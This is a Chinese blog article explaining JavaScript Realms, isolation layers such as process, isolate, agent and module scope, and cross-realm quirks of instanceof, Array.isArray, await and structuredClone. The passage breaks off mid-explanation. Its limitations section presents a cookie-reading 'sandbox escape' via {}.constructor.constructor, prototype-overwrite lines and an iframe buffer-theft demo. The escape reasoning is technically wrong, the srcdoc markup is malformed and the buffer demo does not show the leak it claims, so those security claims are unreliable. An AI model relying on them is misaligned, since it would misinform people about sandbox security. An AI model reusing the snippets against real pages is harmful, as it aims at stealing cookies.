---
title: "Realm：JavaScript 如何在同一个 Heap 里隔离多个世界"
created: "2023-09-09"
updated: "2026-05-25"
tags:
  - JavaScript
  - Realm
description: "从 iframe 的 instanceof 翻车出发，拆解 Process、Thread、Isolate、Realm、Module Scope 五层运行时隔离模型，解释为什么 Symbol.for 能跨 iframe 共享、为什么 Array.isArray 不会翻车，并深入分析 Realm 的六大局限性（Heap 共享、逃逸路径、无能力隔离、性能开销、调试复杂度、规范推进缓慢）。"
status: evergreen
---

## 从一次 iframe 翻车开始

假设你的页面里嵌了一个 iframe：

```html
<iframe src="child.html"></iframe>
```

然后你在主页面里拿到了 iframe 创建的数组：

```js
const iframe = document.querySelector('iframe');

const arr = iframe.contentWindow.Array.of(1, 2, 3);

Array.isArray(arr);   // true
arr instanceof Array; // false
```

看起来很奇怪——`Array.isArray()` 认为它是数组，`instanceof Array` 却认为不是。为什么？

### instanceof 到底在检查什么

很多人以为 `a instanceof B` 是在判断"**a 是不是 B 类型**"。其实不是。

它真正检查的是：**`B.prototype` 是否出现在 `a` 的原型链上**。

例如 `[1, 2, 3] instanceof Array` 本质上是在检查：

```txt
[1,2,3]
→ Array.prototype
→ Object.prototype
→ null
```

而 iframe 里的数组：

```txt
iframe arr
→ iframe.Array.prototype
→ iframe.Object.prototype
→ null
```

注意：`iframe.contentWindow.Array.prototype` 和 `window.Array.prototype` 不是同一个对象。

因此 `arr instanceof Array` 最终得到 `false`。问题并不是"它不是数组"，而是"**它不属于你这个世界里的 Array**"。

### 为什么同一个页面里会有两套 Array？

这才是真正的问题。为什么 `window.Array !== iframe.contentWindow.Array`？为什么同一个页面里，会存在多个互不相认的运行时对象体系？

答案就是：Realm

---

## Realm 是什么

Realm 不是你能在代码里直接调用的 API。它是 ECMAScript 规范里的底层抽象。

一句话：**一个 Realm 就是一套独立的 JavaScript 全局运行时环境**。同一页里的主窗口和 iframe，各自拥有自己的 Realm。

一个 Realm 包含四样东西：

```txt
Realm
├── globalThis                  ← 代码能直接访问的全局入口
├── Intrinsics                  ← 语言内建对象的独立副本
│   ├── %Array%
│   ├── %Object%
│   ├── %Function%
│   ├── %Promise%
│   └── ...
├── Global Environment Record   ← 全局作用域内所有标识符绑定的”账本”
└── Host-defined state          ← 宿主注入的外部能力（DOM、fetch、fs 等）
```

### globalThis —— 代码能摸到的全局入口

`globalThis` 就是这个 Realm 暴露给代码的"全局对象"。浏览器里它是 `window`，Node.js 里它是 `global`，Worker 里它是 `self`。

```js
// 这三个在不同环境里指向同一个东西
globalThis === window;  // 浏览器主线程
globalThis === global;  // Node.js
globalThis === self;    // Web Worker
```

注意：`globalThis` 是 Realm 的**一部分**，不是 Realm 本身。`Realm ≠ window`。

### Intrinsics —— 内建对象的专属副本

`%Array%`、`%Object%`、`%Promise%`……这些带百分号的名字不是 JavaScript 里能直接访问的变量，而是 ECMAScript 规范用来指代”当前 Realm 的那组内建对象”的符号。

每个 Realm 都会初始化自己专属的一套：

```js
window.Array !== iframe.contentWindow.Array;
```

行为一致，身份不同。**同一份菜谱，两个厨师各做了一道菜——味道一样，但不是同一盘。**

因此 Realm 之间不共享 `Array.prototype`、`Object.prototype`、`Function.prototype`、constructor identity、prototype graph。

所以 `arr instanceof Array; // false` 不是因为 `arr` 不是数组，而是因为它属于另一个 Realm 的 Array 体系。这不是浏览器的 bug，是 Realm 的设计目标。

但要注意：Realm 只在**不同** Realm 之间划边界。同一个 Realm 内的所有代码共享同一套 Intrinsics 和 prototype graph——任何脚本修改了 `Array.prototype`，都会立刻影响同 Realm 里的其他所有脚本。广告脚本、第三方库、用户内容，都能互相污染原型链。Realm 不提供内部的脚本隔离。

### Global Environment Record —— 全局变量的”账本”

你可能以为全局变量都挂在 `globalThis` 上，实际上引擎内部有一张更底层的映射表——**Global Environment Record**，记录”这个名字对应哪个值”。

它主要存三类东西：

- `var` 声明的变量和 `function` 声明的函数——同时出现在 `globalThis` 上，可通过 `window.x` 访问
- `let`、`const`、`class` 声明的标识符——在全局作用域内，但**不在** `globalThis` 上，不能通过 `window.x` 访问
- 语言内建的全局引用，如 `undefined`、`NaN`、`Infinity`、`isNaN`、`parseInt`

简言之：`globalThis` 是暴露给代码的入口，Global Environment Record 是引擎内部真正的账本。**每个 Realm 各有一份**。

### Host-defined state —— 宿主注入的”外来能力”

ECMAScript 只规定语言核心（语法、类型、原型链），必须给宿主留一个挂载点，让它把外部世界的能力注入进来。这个挂载点就是 **Host-defined state**。

浏览器里包含：DOM 接口（`document`、`HTMLElement`）、Web API（`fetch`、`setTimeout`、`localStorage`）、扩展注入等。
Node.js 里包含：`require`/`module`/`exports`、`process`/`Buffer`/`fs`、定时器调度等。

**这也是 Realm 不能单独当安全沙箱的根本原因：**

两个 Realm 各有各的 `Array`，各有一套原型链，`instanceof` 互不相认。但它们可能共享同一份 `document`。

```js
// 同源 iframe
iframe.contentWindow.Array === window.Array;       // false — 各自的 Intrinsics
iframe.contentWindow.document === window.document;  // true  — 同一份 DOM
```

具体来说：

- 主页面 Realm 的 `document` 和 iframe Realm 的 `document` 是**同一个对象**
- iframe 里的代码可以调用 `document.querySelector()` 查到主页面的 DOM 节点
- iframe 里的代码可以调用 `document.cookie` 读到主页面的 cookie
- 两个 Realm 里 `fetch` 的实现也来自同一个宿主，发出去的请求走同一个网络栈

用大白话说就是：

> 两个 Realm 像合租——各有各的家具（Intrinsics），但共用一个大门、一个信箱、一个地下室（Host-defined state）。
>
> 你改不了对方的家具，但你能从同一个门进出，能翻同一个信箱。

Realm 隔离的是**对象体系**，不是**能力边界**。真正的安全隔离需要在 Realm 之上额外搭——比如删掉不需要的全局变量、冻结 Intrinsics、配合 CSP。这就是后面会讲的 SES/Compartments 的核心思路。

---

### 常见误解

**误解一：Realm = window**

前文已经说过，`globalThis` 只是 Realm 的入口，不是 Realm 本身。

**误解二：Realm = iframe**

iframe 确实会创建新 Realm，但不是唯一方式。能创建新 Realm 的还有：

- **`window.open`** — 新窗口（或 tab）拥有独立的 Realm，`w.Array === window.Array` 为 `false`
- **`document.implementation.createHTMLDocument()`** — 创建一个脱离 DOM 树的空白文档，背后也有独立的 Realm，常被用来在内存中解析 HTML 而不污染当前页面
- **浏览器内部组件** — Chrome Extension 的 content script 跑在"isolated world"里，本质也是独立 Realm；DevTools 的 console 上下文有时也会切换 Realm

iframe 只是这些方式里最常见的一种。

另外，iframe 本身的隔离也不止 Realm 一层。很多人以为 Realm 是 iframe 唯一的隔离机制，其实现代浏览器会根据安全策略决定 iframe 到底升级到哪一级：

- **同源 iframe** → 通常仅创建新 Realm（同一进程、同一 Isolate）
- **跨域 iframe** → 可能升级到新 Process → 新 Isolate → 新 Agent Cluster

具体取决于 Site Isolation、COOP/COEP、Browsing Context Group 等策略。Realm 只是这个隔离栈里最轻的那一层，不是唯一的那一层。

**误解三：Realm = 安全沙箱**

前文已经详细展开——Realm 隔离对象体系，不隔离能力边界。同一份 `document`、同一个网络栈、共享的 Heap，都意味着 Realm 本身不阻拦任何事。它只是”做隔离”的地基，不是隔离本身。

**误解四：Realm 是浏览器特有的概念**

Realm 是 ECMAScript 规范定义的抽象概念。Node.js 也有（通过 `vm.createContext()` 创建），任何实现了 ECMAScript 的引擎都有这个概念。

---

## 为什么浏览器需要 Realm

### 从 iframe 开始的 Runtime 信任危机

早期浏览器里的 JavaScript Runtime 非常简单：

```
一个页面
→ 一个全局对象
→ 一套 runtime objects
```

所有脚本共享同一个 `window`、同一套 `Array.prototype`、同一套 `Object.prototype`、同一个 global environment。那时浏览器面对的还主要是“页面逻辑”，而不是“多方不可信代码协作”。

后来 iframe 出现了。问题立刻复杂化：

```html
<iframe src="https://third-party.com"></iframe>
```

一个页面内部开始同时运行：广告脚本、第三方 SDK、用户内容、扩展注入代码、不同来源的 iframe。浏览器第一次真正面对：

> 如何在同一个页面里，安全运行多个互不信任的 JavaScript 程序？

如果所有代码仍共享同一个 Runtime World，整个页面都会被污染：

```js
window.fetch = hackedFetch;
Array.prototype.map = evilMap;
Promise.prototype.then = brokenThen;
```

真正危险的并不是 `var x = 1` 这样的变量污染，而是 **Runtime Capability Pollution**——Runtime 本身的能力被污染：prototype chain、intrinsic objects、async scheduling、DOM APIs、global functions……

因为：Scope 只能隔离变量名

浏览器必须解决 **Runtime Isolation（运行时隔离）**：如何在同一个页面里，安全运行多个互不信任的 JavaScript 程序。

但“隔离”并不是一个简单开关。隔离越强，安全性越高、污染越少、崩溃影响越小；共享越多，内存越省、通信越便宜、启动越快、性能越高。浏览器 Runtime Architecture 本质上一直在做“共享”与“隔离”的权衡。

而 Realm，恰好位于这条权衡链条的中间。它不是最强隔离，也不是最轻隔离，但它提供了一个极其关键的能力：

> 在共享 VM 与 Heap 的情况下，隔离 Runtime Object System。

> **VM（JavaScript Virtual Machine）** 即 JS 引擎的执行核心——负责编译、执行 JS 代码的那层基础设施（如 V8 的 Ignition + TurboFan）。它管理调用栈、执行上下文、JIT 编译等。所谓”共享 VM”，就是同一个引擎实例在跑多个 Realm 的代码，而不是为每个 Realm 开一个新的引擎。
>
> **Heap** 是引擎管理的堆内存，存放所有 JS 对象。”共享 Heap” 意味着不同 Realm 的对象可以互相传递引用（`postMessage` 不需要序列化）。
>
> 所以 Realm 的定位是：**引擎和内存都共用，只隔离”全局环境”那一层**——各 Realm 拥有独立的 `Object`、`Array`、`Function` 等内置构造函数，防止全局污染和原型链冲突。

要理解 Realm 为什么存在，必须先理解浏览器里的”隔离谱系”。

---

### JavaScript Runtime 中的几种隔离粒度

很多人学习 Runtime 时会接触到 Process、Thread、Isolate、Agent、Realm、Module Scope，最大的问题是把它们当成彼此独立的知识点。实际上，它们背后是同一条主线：**不同粒度的 Isolation Mechanism**。这些概念并不来自同一层：

| 层级           | 来源                 |
| -------------- | -------------------- |
| Process        | 操作系统             |
| Thread         | OS / 浏览器          |
| Isolate        | JS 引擎实现          |
| Agent          | ECMAScript 并发模型  |
| Realm          | ECMAScript Runtime  |
| Module Scope   | 语言作用域           |

它们并不是严格树状关系，更准确地说：

```
OS Layer
 ├── Process
 └── Thread

VM Layer
 └── Isolate

ECMAScript Layer
 └── Agent
      └── Realm
           └── Module Scope
```

在深入每一层之前，我们要先抓住一条隐藏主线：**执行与隔离从来都是一体两面**。有执行的地方，就需要隔离来保护执行；隔离的边界，又反过来决定了谁能在哪里执行。接下来我们就从进程开始，沿着这条主线一步步往下讲。

---

#### Process（操作系统隔离）—— 最重的隔离，也是最“独立”的执行者

在操作系统眼里，**进程就是一个独立运行的程序**。它既是一个“执行单位”（程序在这个容器里跑），也是一个“隔离单位”（不同进程之间互相防着）。这俩角色在进程身上是合二为一的。

##### 进程的执行：一个完全独立的“运行世界”

当你启动一个程序，操作系统就会创建一个进程。这个进程拥有自己的一整套资源：一块专属内存、一个主线程、文件句柄、权限标记等。从执行的角度看，进程就是一个 **完整的“执行世界”**，它内部的代码可以自由运行，不需要担心外面的东西干扰它，也不需要担心自己会不小心踩到别人。

大白话说就是：**进程就像一栋独栋别墅**，里面的人想怎么折腾就怎么折腾，不会吵到隔壁，隔壁着火也不会烧到你。每个别墅独立供水供电，有自己的门锁。

##### 进程的隔离：OS 级的内存防火墙

不同进程之间默认**不共享内存**。一个进程崩了，不会把别的进程带崩；一个进程有权限读某个文件，另一个进程未必能读。这就是 OS 级别的隔离，非常强力。

浏览器大量依赖这一点。比如 Chrome 的 **Site Isolation** 会把跨站 iframe 放进独立进程（OOPIF），这样做的逻辑很简单：**你不信任的那个页面，直接给它一栋独立的别墅，彻底隔绝**。它再怎么恶意，也读不到你银行页面的内存。

此时 iframe 同时拥有了进程隔离和后面要讲的 Realm 隔离，两者并不矛盾，只是负责不同的活儿：

| 机制    | 解决的问题             |
| ------- | -------------------- |
| Process | 跨进程内存隔离       |
| Realm   | 同 VM 内对象体系隔离 |

##### 进程的代价：贵，而且贵在执行 + 隔离一起上

进程之所以安全，是因为它把 **执行环境** 和 **隔离边界** 一起打包了。但问题也出在这里：每开一个进程，就要重新建一套完整的执行世界。内存开销大，进程间通信（IPC）又慢又烦琐。如果一个页面有几十个 iframe 且每个都独占一个进程，内存直接爆炸。

所以浏览器需要一种更轻量级的“执行 + 隔离”方案：**能不能在一栋别墅里，分出几个独立的工作间，让不同的人在里面各自干活，互不干扰？** 这就引出了线程和 VM 隔离。

---

#### 从 Process 到 VM：执行可以共享，隔离必须保留

进程让我们看到了“执行与隔离”的极限形态：**一套执行环境配一套隔离墙**。但现实是，浏览器经常需要在同一个页面里跑很多互不信任的代码，给每个都分配一个进程太浪费了。

于是思路变成了这样：

> **执行环境可以共享同一个进程，但隔离必须依然存在。**

这就带来了两个问题：
1. 既然共享了进程，谁在进程里同时干活？（线程）
2. 干活的人共享了内存，怎么保证 JavaScript 的运行时状态不被互相写坏？（VM 隔离）

接下来要讲的 Thread、Isolate、Agent，就是在回答这两个问题。它们共同构成了 Process 之下、Realm 之上那一层 **“执行与 VM 隔离”** 的核心。

---

#### 并发与 VM 隔离：Thread、Isolate、Agent

上一节我们说了：进程太贵，不能每个 iframe 都开一栋别墅。那能不能共用一栋别墅？可以，但你得解决一个新问题：**共用一栋别墅的人多了，怎么保证他们不互相踩脚？**

这一章的 Thread、Isolate、Agent 就是在回答这个问题。三者各管一层，共同完成了同一件事：**在共享的进程里，让 JavaScript 代码既安全又高效地并发执行**。如果用一个比喻来理解它们的关系：

- **Thread** 是“谁在干活”（执行载体）。
- **Isolate** 是“干活的独立工作台”（VM 隔离边界）。
- **Agent** 是规范给每个干活单位开的“正式工号”（执行实体的标准定义）。

干活的人多了，就需要工作台隔开；工作台的规格，又需要一个统一的标准。下面我们逐一来看。

##### Thread：谁来干活 —— 执行引发并发，并发引发冲突

线程解决的不是“对象怎么隔离”，而是“谁在同时执行”。浏览器内部有很多线程，就像一个大车间里不同工种的工人：

| 线程                | 职责               |
| ------------------- | ------------------ |
| Main Thread         | 执行 JS / DOM     |
| Compositor Thread   | 合成画面           |
| IO Thread           | 网络与磁盘 IO     |
| Worker Thread       | 后台任务           |
| Raster Thread       | 光栅化             |

有了这些线程，浏览器就可以一边渲染页面、一边跑 JavaScript、一边下载资源、一边解图片，这叫 **并行执行**。

但问题是：**所有线程共享同一个进程的内存**。这就好比工人们都在同一个车间里，工具、材料全摆在一起。如果两个人同时去拧同一个螺丝，一定会出乱子。

JavaScript 引擎的堆内存里放着 JS Objects、Prototype Chains、Closures、Hidden Classes、Inline Cache、JIT 编译后的代码等等。这些东西并不是线程安全的——你没办法一边改原型链，另一边在执行依赖于这个原型链的优化代码。如果多线程同时乱写，结果就是 **VM State Corruption**，引擎直接崩掉。

所以线程带来的核心矛盾是：

> **我们需要更多线程来并发干活，但共享的 JS 运行时状态经不起多线程同时乱动。**

线程解决了“执行”，却制造了“隔离”的迫切需求。这就轮到 Isolate 出场了。

##### Isolate：给每个 JS 执行者一个独立的工作台 —— 隔离保护执行

Isolate 是 V8 提供的独立 VM 实例。你可以把它理解为：**每个 Isolate 都是一个自带小车间的工作台**。它拥有：

```
Isolate
├── Heap              (自己的材料柜)
├── Garbage Collector (自己的清洁工)
├── Runtime State     (自己的工作进度)
├── JIT Metadata      (自己的速记本)
├── Inline Cache      (自己的快速通道)
└── Execution State   (自己的工作状态)
```

不同 Isolate 之间，这些资源**完全独立**。所以从效果上看，一个 Isolate 就是一个微型的“独立 JS 虚拟机”。

Isolate 和执行的配合有一条铁律：

> 同一个 Isolate 的 JavaScript Execution State **不能被多个线程同时操作**。任何时刻，一个 Isolate 只能有一个 active JS execution thread。

这条规则的意思很直白：**这个工作台虽然很独立，但一次只能有一个人在上面干活**。因为它里面所有东西都假定只有一个人在用，所以不需要加锁，不需要考虑复杂的并发控制，执行效率高，安全也保住了。

那么并发怎么办？很简单：**多开几个工作台**。不同 Isolate 之间可以**真正并行执行** JavaScript（例如 Main Thread Isolate 和 Worker Isolate 可以同时跑）。于是浏览器实现了：
- 在同一个 Isolate 内：单线程执行 → 安全。
- 在不同 Isolate 间：多线程并发执行 → 高效。

所以 Isolate 的角色就是：

> Isolate ≈ JavaScript 执行边界（为一个执行线程提供独立的运行时环境）

它比进程轻（仍在一个进程内），但又足够重：堆、GC、JIT 全套都有。这带来的问题是，如果每个 iframe 都分配一个 Isolate，相当于给每个小摊位都配一个完整的豪华工作间，成本还是太高。很多 iframe 只是同站嵌入、放个 UI 容器，不需要整一套独立 VM。这就为 Realm 的出现埋下伏笔：能不能共享工作间，只隔开各自的图纸（对象图表）？

回到最开始的 iframe 例子：主窗口和 iframe 其实共享同一个 Isolate（同一个 V8 实例），但各自拥有自己的 Realm——各自的 Intrinsics、各自的原型链。这就是为什么 `iframe.Array !== window.Array`，而它们又跑在同一个引擎里。下面我们就来看 Realm 到底怎么做到这一点。

在继续之前，我们还要回答一个问题：不同 JavaScript 引擎实现各异，规范怎么统一描述“这种有独立工作台的执行者”呢？答案就是 Agent。

##### Agent：ECMAScript 的“正式工号”——既描述执行，又定义隔离

Isolate 是 V8 自家的概念，换个引擎可能叫别的名字。但 ECMAScript 规范需要一套通用的术语，于是就有了 **Agent**。

**为什么规范不直接用“线程”？**  
因为不是所有环境都有真正的 OS 线程。有些嵌入场景可能用协程或任务调度器来实现并发。规范必须抽象掉这些实现细节，只定义“什么样算一个独立的执行单元”。

**Agent 是什么？**  
Agent 就是 ECMAScript 里**一个正式的“执行实体”**。它同时拥有执行能力和隔离边界：

```
Agent
├── Execution Context Stack    (你的工作台执行到哪儿了)
├── Job Queue                  (等着干的活儿)
├── Microtask Queue            (急茬的微任务)
├── Global Symbol Registry     (你自己的符号本)
└── Multiple Realms            (你名下还管着几个小图纸箱)
```

注意：**Thread ≠ Agent**。线程是实现层的工人，Agent 是规范给这个工人定义的“正式工号”。规范只规定：每个 Agent 独立拥有自己的执行上下文栈和任务队列，从而在语义上保证了不同 Agent 的执行是隔离且独立调度的。

因此，Agent 的角色是：

> Agent = spec-level concurrency unit（既管执行，也管隔离边界的标准定义）

##### 三者如何串起来：执行需要隔离，隔离服务执行

总结一下这一层的关系：

- **执行**：由 Thread 承载（谁在干活）。
- **隔离**：由 Isolate 提供独立运行时（工作台，保护干活不出错）。
- **规范**：Agent 把“干活的人+他的工作台”抽象为标准概念（工号）。

通常的映射是：浏览器主线程是一个 Agent / Isolate，Web Worker 是另一个 Agent / Isolate。规范允许其他映射，但无论怎么映射，核心逻辑不变：

> **执行产生隔离的需求，隔离反过来保障执行的安全。** 这一层 VM 隔离，就是在进程这个大别墅里，给每个 JS 执行者分配带锁的独立工作室。

##### 为什么需要这一层 VM 隔离

进程隔离太贵，线程并发太乱。VM 隔离（Isolate / Agent）在同一个进程内提供了独立的执行环境和堆，让**不同信任域的代码既能并行执行，又不互相污染运行时状态**。这就是它存在的意义：在 Process 的“重”和 Realm 的“轻”之间，为安全并发执行找到了一个平衡点。

然而 Isolate 依然意味着独立的堆和 GC。对于只需隔离对象图表（而非整个堆）的场景，它还是重。这正是下一章 Realm 要解决的问题：**在共享 VM、共享 Heap、共享 GC 的前提下，仅隔离 Intrinsics、Prototype Graph 和 Global Object，完成最小成本的 Runtime Capability Isolation。** 执行还在同一个 Agent/Isolate 内，但对象体系被悄悄地分了家。

---

#### Realm（Runtime Object Graph 隔离）—— 同一个工作台，不同的图纸

终于来到 Realm。Realm 到底隔离什么？它隔离的不是 Heap、GC、Thread、JIT，而是 **Runtime Object System**——每个 Realm 都有属于自己的一套内置对象世界观。（前面已经介绍过 Realm 的四组件，这里不再重复。）

核心要点是：规范里的 Realm 在 V8 中大致对应 **Context**：

```
Isolate
├── Context (main window)
├── Context (iframe A)
└── Context (iframe B)
```

这些 Context 共享 Heap、GC、Isolate，但各有各的 global object 和 intrinsics。所以 `window.Array !== iframe.Array` 本质上是不同 Context 用了不同的内置对象。

---

#### Module Scope（作用域隔离）—— 同一个项目组，不同的抽屉

很多时候，我们不需要 Runtime 隔离，只是不想变量污染全局。这时 ES Module 就足够了。

##### Module Scope 隔离的是什么

Module 隔离的是 **Lexical Scope**（词法作用域），即变量名和绑定的环境。但它不隔离 `Array`、`Object`、`Promise` 等内置对象。所以 `Array === globalThis.Array` 仍然成立，因为模块仍属于当前 Realm。

用大白话讲：**Realm 给你一整套独立的内置工具，Module 只是在自己的小抽屉里放变量，工具还是大家共享那套。**

```js
// module.js
var x = 1;
// 这个 x 不会变成 globalThis.x
```

因为 ES Module 创建了独立的 Module Environment Record，顶层变量不会漏到全局。

##### Module 与 Realm 完全不是一个层级

| 问题                     | 对应机制      |
| ------------------------ | ------------- |
| 对象属于哪个 Runtime World | Realm         |
| 变量是否污染全局         | Module Scope  |

Realm 更底层，决定“你用的 Array 是谁家的”；Module 决定“你声明的变量别人看不看得到”。

---

#### 浏览器中的 Isolation Stack

最终，浏览器不是只用一种隔离，而是像俄罗斯套娃一样 **多层隔离叠加**：

```
Tab
└── Process        (一栋独栋别墅)
     └── Isolate   (别墅里带锁的独立工作室)
          └── Agent (工作室的正式工号，管执行管隔离)
               └── Realm    (工作室里的项目组，各有一套自己的参考手册)
                    └── Module Scope (项目组内部的个人抽屉)
```

每一层都在回答同一个问题：**在哪里划隔离的线，让执行又安全、又高效、又省钱**。跨站点安全用进程，并行 JS 安全用 Isolate/Agent，iframe 对象体系隔离用 Realm，变量防泄漏用 Module Scope。这就是浏览器 Runtime Architecture 的核心哲学。

---

## Realm 如何影响 JavaScript 行为

理解了 Realm 是什么，为什么之后，很多 JavaScript 里的"诡异行为"就能串起来了。它们背后有一个共同的问题：**这个对象属于哪个 Runtime World？**

---

### 为什么 instanceof 会翻车

再回顾一下：

```js
const arr = iframe.contentWindow.Array.of(1, 2, 3);

arr instanceof Array;
// false
```

原因是：instanceof → 检查 prototype identity。也就是检查 `Array.prototype` 是否存在于对象原型链上。

而跨 Realm 时 `iframe.Array !== window.Array`，因此 `iframe.Array.prototype !== window.Array.prototype`。

最终 `arr instanceof Array` 失败。问题不是"它不是数组"，而是"**它不属于你这个 Realm 的 Array 体系**"。

---

### 为什么 Array.isArray 不会翻车

但 `Array.isArray(arr)` 为什么又正常？

因为 **`Array.isArray()` 根本不依赖 constructor identity**。它底层调用的是 ECMAScript 规范里的 **IsArray** 抽象操作。

##### IsArray 检查的不是 prototype

它检查的是：这个对象是否是 **Array Exotic Object**。

Exotic Object 指的是拥有特殊内部行为的对象。例如数组拥有：自动同步的 `length`、数字索引行为、特殊元素存储语义。这些都不是普通对象能模拟的。

因此 `Array.isArray()` 判断的是**内部语义（internal slots）**，而不是构造函数 identity。这也是为什么 `Array.isArray(iframeArr)` 跨 Realm 仍然成立。

---

### 为什么 Object.prototype.toString 更稳

很多老库喜欢 `Object.prototype.toString.call(value)`，例如 `Object.prototype.toString.call([])` 返回 `[object Array]`。

原因也是：它不依赖当前 Realm 的构造函数身份，而是基于对象内部的 **brand** 生成标签。因此比 instanceof 更适合跨 Realm 判断。

##### 但 Symbol.toStringTag 可以伪造

这里有个重要问题：

```js
const fake = {
  [Symbol.toStringTag]: 'Array'
};

Object.prototype.toString.call(fake);
// [object Array]
```

因此 `Symbol.toStringTag` 可以欺骗 toString。

不过这里还有个容易误解的点：很多人会以为 `[object Array]` 只是 `Symbol.toStringTag` 拼出来的，其实并不完全是。

##### 内建 brand 与 toStringTag 并不等价

对于 Array、Date、Map、Set、Promise 这些内建对象，规范内部存在**内建 brand**。它们和用户态的 `Symbol.toStringTag` 不是完全同一个机制，只是 `Object.prototype.toString` 最终会结合它们生成标签。

因此 `Object.prototype.toString` 虽然比 `instanceof` 更稳定，但它依然不是绝对可靠的类型判断。

---

### Promise 为什么更有意思

来看另一个经典例子：

```js
const p = iframe.contentWindow.Promise.resolve(1);

p instanceof Promise;
// false
```

同样翻车。因为 Promise constructor identity 不同。

但 `await p` 却完全正常。为什么？

##### await 不依赖 Promise identity

因为 `await` 并不会检查 `p instanceof Promise`。它真正做的是 **Promise Assimilation**——只要对象拥有可调用的 then 方法，就按 Promise-like 对象处理。

例如：

```js
await {
  then(resolve) {
    resolve(123);
  }
};
```

也能正常工作。

因此 `await` 依赖的是**行为协议（thenable protocol）**，而不是 constructor identity。这也是为什么 `await iframePromise` 跨 Realm 完全正常。

---

### structuredClone 为什么能"重新绑定"

再来看一个特别有意思的行为：

```js
const cloned = structuredClone(iframeArr);

cloned instanceof Array;
// true
```

为什么 clone 之后又突然"认祖归宗"了？

##### 因为 Structured Clone 会重建对象

很多人误以为 `structuredClone` 只是深拷贝。其实不是。它背后运行的是 **Structured Clone Algorithm**，这个算法会在目标 Realm 中重新创建对应 Runtime Objects。

也就是说，iframe Array clone 到当前 Realm 后，会重新使用 `currentRealm.Array` 创建。因此 `cloned instanceof Array` 重新成立。

##### 这不是"复制引用"

而是"在新的 Runtime World 中重新 hydrate 对象"。这点非常关键，因为它说明：**Runtime Object Identity 是 Realm-local 的**。对象不是纯数据，它还绑定着所属 Runtime World。

---

### prototype pollution 为什么会影响整个世界

Realm 还有一个非常现实的影响：**Prototype Pollution**。

例如 `Object.prototype.hacked = true`。为什么这种污染会影响整个应用？

原因就在于：**同一个 Realm 内的对象，共享同一套 prototype graph**。也就是说，同一个 Runtime World → 共享同一个 Object.prototype。

因此 prototype pollution 本质上是 **Runtime Object Graph 污染**。这也是为什么 SES、Compartments、Frozen Intrinsics 会变得越来越重要。

### Symbol.for 为什么能跨 iframe 相等

来看一个经典问题：

```js
Symbol.for('x') === iframe.Symbol.for('x'); // true ?
```

不是说 Realm 隔离了吗，为什么两边拿到同一个 Symbol？

关键在于：**Global Symbol Registry 属于 Agent，不属于 Realm**。

同源的主窗口和 iframe 通常共享同一个 Agent，因此 `Symbol.for('x')` 查找的是 Agent 级别的 Symbol Registry，而不是某个 Realm 内部的注册表——两边查到的是同一张表，结果自然一致。

但 Web Worker 通常是独立的 Agent（有自己的执行上下文栈和任务队列），因此 Worker 里的 `Symbol.for('x')` 和主线程里的查的不是同一张表，往往不相等。

---

## Realm 的局限性

Realm 能做的和不能做的，边界必须搞清楚。否则在实际项目中容易踩坑——或者更危险的是，以为自己做了隔离，其实根本没防住。

### 局限一：只隔离全局对象图，不隔离 Heap

Realm 隔离的是 global object graph，但底层 Heap 在实现层面往往是共享的。

来写个浏览器里的例子。主页面嵌了一个 iframe，通过 `postMessage` 传了一个 `ArrayBuffer`：

> **`postMessage` 是什么？** 浏览器提供的跨窗口通信 API。主页面和 iframe 不能直接访问对方的 JS 变量，但可以通过 `postMessage` 发消息。
>
> 普通对象传过去时，浏览器会做一次 **Structured Clone（深拷贝）**——对方拿到的是副本，改了不影响你。
>
> 但 `ArrayBuffer` 是 **Transferable（可转移）** 的。传过去之后，主页面那份引用会**失效**，底层内存的控制权直接交给了对方——不是拷贝，是交接。

```html
<!-- 主页面 -->
<iframe id="sandbox" src="sandbox.html"></iframe>
<script>
  const secret = new Uint8Array([72, 101, 108, 108, 111]); // "Hello" 的 ASCII

  document.getElementById('sandbox').onload = () => {
    // 把 buffer "移交"给 iframe（不是拷贝，是交接）
    // 传完之后，主页面的 secret.buffer 变成 detached（失效）
    // 但 iframe 拿到了这块内存的完整控制权
    document.getElementById('sandbox')
      .contentWindow
      .postMessage(secret.buffer, '*', [secret.buffer]);
  };

  window.addEventListener('message', (e) => {
    console.log('iframe 说：', e.data); // "Hello" 💀
  });
</script>
```

```html
<!-- iframe（沙箱） -->
<script>
  window.addEventListener('message', (e) => {
    const buf = e.data;
    const view = new Uint8Array(buf);
    const stolen = Array.from(view)
      .map(c => String.fromCharCode(c))
      .join('');
    parent.postMessage(stolen, '*');
  });
</script>
```

看到了吗？两个 Realm——主页面和 iframe——有各自的 `Array`、各自的 `Object`、各自的原型链，`instanceof` 互相不认识。

但只要底层的 `ArrayBuffer` 通过 `postMessage` 的 transfer 机制移交过去，iframe 就拿到了那块内存的完全控制权。

用大白话说就是：

> 你租了两套房（两个 Realm），家具完全不同，钥匙也不通用。
>
> 但两套房共用一个地下室（Heap）。
>
> 只要有人知道地下室的入口在哪，他就能从你的套房下面钻进来。

Realm 保证的是"你改不了我的 `Array.prototype`"，但不保证"你看不见我分配的内存"。

这不是 `SharedArrayBuffer` 才有的问题。普通的 `ArrayBuffer`、`TypedArray`、甚至 `DataView`，只要引用被跨 Realm 传递，两个世界就能通过同一块内存通信——而且**不需要任何权限检查**。

**实际影响**：如果你在做沙箱，别以为 Realm 隔离了就万事大吉。底层内存共享意味着：
- 攻击者可能读到主页面未清理的敏感数据（**信息泄露**）
- 攻击者可能修改主页面正在使用的 buffer（**数据篡改**）
- 两个 Realm 可以通过共享内存建立隐蔽信道，绕过你的监控（**侧信道通信**）

### 局限二：无法阻止逃逸（Escape）

想象你用 iframe 做沙箱，觉得只要不暴露 `parent` 就安全了：

```html
<!-- 主页面 -->
<iframe id="sandbox" srcdoc="<script>/* 沙箱代码 */</iframe>"
        sandbox="allow-scripts"></iframe>
```

`sandbox` 属性限制了 iframe 的权限，不能访问父页面、不能弹窗、不能提交表单。看起来很安全。

但攻击者写的沙箱代码是这样的：

```js
// 沙箱里的代码
// {}.constructor → Object（iframe 自己的 Object）
// Object 本身是函数 → Object.constructor → 外层的 Function！
const outerFunction = {}.constructor.constructor;

// 用外层的 Function 创建任意代码执行
const evil = outerFunction('return document.cookie');
console.log(evil()); // 👈 拿到了主页面的 cookie
```

一步步拆解：

```js
// 第一步：沙箱里的 {} 是 iframe 的 Object 创建的
{};
// → 一个普通对象

// 第二步：它的 constructor 是 iframe 自己的 Object
{}.constructor;
// → Object（iframe 的 Object）

// 第三步：Object 本身是函数，函数的 constructor 是 Function
{}.constructor.constructor;
// → Function
// 为什么是外层的？因为 iframe 的 Object 构造函数本身是个函数对象，
// 它的 __proto__ → Function.prototype，而这个 Function.prototype
